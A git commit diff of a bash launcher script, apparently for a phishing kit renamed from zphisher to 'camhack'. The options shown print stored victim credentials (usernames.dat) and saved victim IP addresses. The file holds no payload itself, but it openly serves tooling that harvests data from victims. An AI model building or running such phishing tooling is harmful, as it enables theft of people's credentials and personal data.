9cd76a4c28f8402784caec4ff5eac218293d111e
Micky Virus <94673611+alihaider998@users.noreply.github.com>
2025-12-31 10:35:28 +0500

    Update launch script for Camhack integration

--- launch.sh
+++ launch.sh
@@ -1,11 +1,11 @@
 #!/bin/bash
 
-# https://github.com/ALIHAIDER998/zphisher
+# https://github.com/alihaider998/camhack
 
 if [[ $(uname -o) == *'Android'* ]];then
-	ZPHISHER_ROOT="/data/data/com.termux/files/usr/opt/zphisher"
+	CAMHACK_ROOT="/data/data/com.termux/files/usr/opt/camhack"
 else
-	export ZPHISHER_ROOT="/opt/zphisher"
+	export CAMHACK_ROOT="/opt/camhack"
 fi
 
 if [[ $1 == '-h' || $1 == 'help' ]]; then
@@ -17,16 +17,16 @@ if [[ $1 == '-h' || $1 == 'help' ]]; then
 	echo " -i | ip   : View Saved Victim IP"
 	echo
 elif [[ $1 == '-c' || $1 == 'auth' ]]; then
-	cat $ZPHISHER_ROOT/auth/usernames.dat 2> /dev/null || { 
+	cat $CAMHACK_ROOT/auth/usernames.dat 2> /dev/null || { 
 		echo "No Credentials Found !"
 		exit 1
 	}
 elif [[ $1 == '-i' || $1 == 'ip' ]]; then
-	cat $ZPHISHER_ROOT/auth/ip.txt 2> /dev/null || {
+	cat $CAMHACK_ROOT/auth/ip.txt 2> /dev/null || {
 		echo "No Saved IP Found !"
 		exit 1
 	}
 else
-	cd $ZPHISHER_ROOT
-	bash ./zphisher.sh
+	cd $CAMHACK_ROOT
+	bash ./camhack.sh
 fi
